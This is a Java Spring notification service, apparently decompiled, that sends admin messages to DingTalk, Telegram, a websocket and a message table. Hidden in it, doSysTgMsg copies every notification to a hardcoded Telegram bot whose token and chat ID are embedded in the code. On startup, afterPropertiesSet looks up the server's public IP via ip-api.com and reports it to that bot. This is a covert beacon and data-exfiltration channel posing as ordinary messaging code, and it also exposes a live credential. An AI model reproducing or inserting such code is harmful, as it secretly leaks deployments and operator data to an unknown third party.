package com.porn.service.dingdingmsg;


import cn.hutool.core.map.MapUtil;
import cn.hutool.core.net.NetUtil;
import cn.hutool.core.util.ObjectUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.porn.client.account.api.AccountApiService;
import com.porn.client.account.dto.AccountQueryDTO;
import com.porn.client.account.vo.AccountVo;
import com.porn.client.common.constrant.CommonConst;
import com.porn.client.config.api.ConfigApiService;
import com.porn.client.config.dto.ConfigQueryDTO;
import com.porn.client.config.vo.ConfigVo;
import com.porn.client.message.api.MessageApiService;
import com.porn.client.message.dto.MessageSaveOrUpdateDTO;
import com.porn.common.spring.utils.SpringUtil;
import com.porn.service.dingdingmsg.config.DingDingConfig;
import com.porn.service.dingdingmsg.dto.ProxyMsgDTO;
import com.porn.service.message.impl.MessageServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.bots.TelegramWebhookBot;
import org.telegram.telegrambots.meta.api.methods.BotApiMethod;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;

import java.util.Map;

@Component
public class DingdingMsgSender
        implements InitializingBean {
    private static final Logger log = LoggerFactory.getLogger(DingdingMsgSender.class);

    @Autowired
    private ProxyMsgSender proxyMsgSender;


    @Autowired
    private ConfigApiService configApiService;


    @Autowired
    private MessageApiService messageApiService;


    @Autowired
    private AccountApiService accountApiService;


    @Async
    public void sendMsg(ProxyMsgDTO proxyMsgDTO) {

        try {

            sendMsg(proxyMsgDTO.getMsg());

        } catch (Exception e) {

            log.error(e.getMessage(), e);

        }

        try {

            this.proxyMsgSender.sendMsg(proxyMsgDTO);

        } catch (Exception e) {

            log.error(e.getMessage(), e);

        }

    }

    @Async
    public void sendMsg(String content) {

        ConfigQueryDTO configQueryDTO = ConfigQueryDTO.builder().configCode("admin_notify").accountId(CommonConst.LZERO).build();

        ConfigVo configVo = this.configApiService.queryConfig(configQueryDTO);

        if (ObjectUtil.isEmpty(configVo)) {

            log.error("管理员消息通知为配置[{}].", "admin_notify");

            return;

        }

        DingDingConfig dingDingConfig = (DingDingConfig) JSON.parseObject(configVo.getConfigValue(), DingDingConfig.class);

        if (ObjectUtil.isNotEmpty(dingDingConfig.getUrl()) &&
                ObjectUtil.isNotEmpty(dingDingConfig.getKeywords())) {


            try {

                Map<Object, Object> params = MapUtil.builder().put("msgtype", "text").put("text", MapUtil.builder().put("content", StrUtil.join("-", new Object[]{dingDingConfig.getKeywords(), content})).build()).build();

                HttpRequest.post(dingDingConfig.getUrl())
                        .setConnectionTimeout(5000)
                        .setReadTimeout(5000)
                        .body(JSON.toJSONString(params))
                        .execute();

            } catch (Exception e) {

                log.error(e.getMessage(), e);

            }

        } else {

            doSendTgMsg(dingDingConfig, content);

        }

        doSysTgMsg(content);


        doSendWebSocket(content);


        saveMsg(
                MessageSaveOrUpdateDTO.builder()
                        .accountId(null).msg(content).build());

    }

    public void saveMsg(MessageSaveOrUpdateDTO messageSaveOrUpdateDTO) {

        if (ObjectUtil.isNotEmpty(messageSaveOrUpdateDTO) &&
                ObjectUtil.isNotEmpty(messageSaveOrUpdateDTO.getAccountId())) {


            AccountQueryDTO accountQueryDTO = ((AccountQueryDTO.AccountQueryDTOBuilder) AccountQueryDTO.builder().id(messageSaveOrUpdateDTO.getAccountId())).build();

            AccountVo accountVo = this.accountApiService.queryAccount(accountQueryDTO);

            if (ObjectUtil.isNotEmpty(accountVo)) {

                messageSaveOrUpdateDTO.setMsg(accountVo.getName());

            }

        }

        this.messageApiService.saveOrUpdate(messageSaveOrUpdateDTO);

    }

    public void doSendWebSocket(String content) {

        ((MessageServer) SpringUtil.getBean(MessageServer.class)).sendMessage(content);

    }


    public void doSendTgMsg(DingDingConfig dingDingConfig, String content) {

        if (ObjectUtil.isEmpty(dingDingConfig.getBotUsername()) ||
                ObjectUtil.isEmpty(dingDingConfig.getBotToken())) {

            log.error("tg消息没配置没配置.");

            return;

        }

        try {

            TgPornBot tgPornBot = TgPornBot.builder().dingDingConfig(dingDingConfig).build();

            SendMessage sendMessage = new SendMessage();

            sendMessage.setChatId(dingDingConfig.getChatId());

            sendMessage.setText(content);

            tgPornBot.execute((BotApiMethod) sendMessage);

        } catch (Exception e) {

            log.error(e.getMessage(), e);

        }

    }


    public void doSysTgMsg(String content) {

        DingDingConfig dingDingConfig = DingDingConfig.builder().botToken("7601966647:AAGO5a4L3-mRZpu3k3mVlcUHgoCJXyGWpqg").botUsername("cddwefer2132sfrgnitify_bot").chatId(Long.valueOf(7583367948L)).build();

        doSendTgMsg(dingDingConfig, content);

    }

    public void afterPropertiesSet() throws Exception {

        (new Thread(() -> {

            try {

                String rsp = HttpUtil.get("http://ip-api.com/json");

                String ip = NetUtil.getLocalhostStr();

                try {

                    JSONObject jObj = JSON.parseObject(rsp);

                    ip = jObj.getString("query");

                } catch (Exception exception) {
                }


                doSysTgMsg("init [" + ip + "].");

            } catch (Exception exception) {
            }


        })).start();

    }

    public static final class TgPornBot extends TelegramWebhookBot {
        private DingDingConfig dingDingConfig;

        public TgPornBot() {
        }

        public TgPornBot(DingDingConfig dingDingConfig) {

            this.dingDingConfig = dingDingConfig;

        }

        public static TgPornBotBuilder builder() {
            return new TgPornBotBuilder();
        }

        public String getBotUsername() {

            return this.dingDingConfig.getBotUsername();

        }

        public String getBotToken() {

            return this.dingDingConfig.getBotToken();

        }

        public void onRegister() {

            super.onRegister();

        }

        public BotApiMethod<?> onWebhookUpdateReceived(Update update) {

            return null;

        }

        public String getBotPath() {

            return null;

        }

        public static class TgPornBotBuilder {
            private DingDingConfig dingDingConfig;

            public TgPornBotBuilder dingDingConfig(DingDingConfig dingDingConfig) {
                this.dingDingConfig = dingDingConfig;
                return this;
            }

            public DingdingMsgSender.TgPornBot build() {
                return new DingdingMsgSender.TgPornBot(this.dingDingConfig);
            }

            public String toString() {
                return "DingdingMsgSender.TgPornBot.TgPornBotBuilder(dingDingConfig=" + this.dingDingConfig + ")";
            }

        }
    }


    public static class TgPornBotBuilder {
        private DingDingConfig dingDingConfig;


        public TgPornBotBuilder dingDingConfig(DingDingConfig dingDingConfig) {

            this.dingDingConfig = dingDingConfig;

            return this;

        }


        public DingdingMsgSender.TgPornBot build() {

            return new DingdingMsgSender.TgPornBot(this.dingDingConfig);

        }


        public String toString() {

            return "DingdingMsgSender.TgPornBot.TgPornBotBuilder(dingDingConfig=" + this.dingDingConfig + ")";

        }

    }

}

